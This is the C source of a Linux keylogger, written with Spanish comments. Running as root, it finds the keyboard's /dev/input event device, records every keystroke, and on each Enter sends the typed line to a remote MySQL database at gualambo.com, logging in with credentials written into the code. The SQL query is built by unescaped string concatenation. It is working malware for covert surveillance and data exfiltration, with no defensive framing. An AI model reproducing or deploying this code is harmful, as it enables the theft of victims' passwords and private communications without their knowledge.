#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <mysql.h>
#include "keys.h"

char *getEvent();
char *cadena;

int enviar(char *cadena){
	MYSQL *conn; /* conexión para MySQL */
	MYSQL_RES *res; /* resultado de la consuta */
	MYSQL_ROW row; /*contendra los campos por cada registro consultado */
	char *server = "gualambo.com"; 
	char *user = "gualambo2"; 
	char *password = "gualambo2"; 
	char *database = "g_key"; 
	conn = mysql_init(NULL); 

	/* conectar a la base de datos */
	if (!mysql_real_connect(conn, server, user, password, database, 0, NULL, 0)){
		fprintf(stderr, "%s\n", mysql_error(conn)); 
		return 2;
	}
	
	char sql2[1000];strcpy(sql2,"");
	
	strcpy(sql2,"insert into keylogger (texto) values ('");
				
	strcat(sql2,cadena);
	strcat(sql2,"')");
				
	

	/* enviar consulta SQL */
	if (mysql_query(conn, sql2)){ 
		fprintf(stderr, "%s\n", mysql_error(conn));
		return 3;
	}


	mysql_close(conn);
	
	return 1;
}

int main(int argc, char **argv){

	
	if(geteuid() !=0){
	
		exit(1);
	}
		
	static char dir_event[20] = "/dev/input/";
	strcat(dir_event, getEvent());
	
	struct input_event event;
	int fd = open(dir_event,O_RDONLY);
	if(fd == -1)
		exit(2);
	
	char str[1000];strcpy(str,"");
	char sql2[1000];strcpy(sql2,"");
	int cont=0;
	while(read(fd, &event, sizeof(event))>0){
		
		if(event.type==EV_KEY && event.value == 1 && event.code <112){
			if(strcmp(keys[event.code],"<enter>")==0){


				/* enviar consulta SQL */
				enviar(str);
				/******************************************/
				strcpy(str,"");cont=0;
			}else{
				strcat(str,keys[event.code]);cont++;
			}
			
			
		}
			
		fflush(stdout);
	}
	
	return 0x0;
}

char *getEvent(){
	char *comando = (char *)
	"grep -E 'Handlers|EV' /proc/bus/input/devices | "
	"grep -E -B1 120013 | "
	"grep -E -o event[0-9]";
	
	static char event[8];
	FILE *pipe = popen(comando, "r");
	
	if(!pipe)
		exit(1);
		
	fgets(event, 8,pipe);
	pclose(pipe);
	event[strlen(event) - 1] = 0x0;
	return event;
}
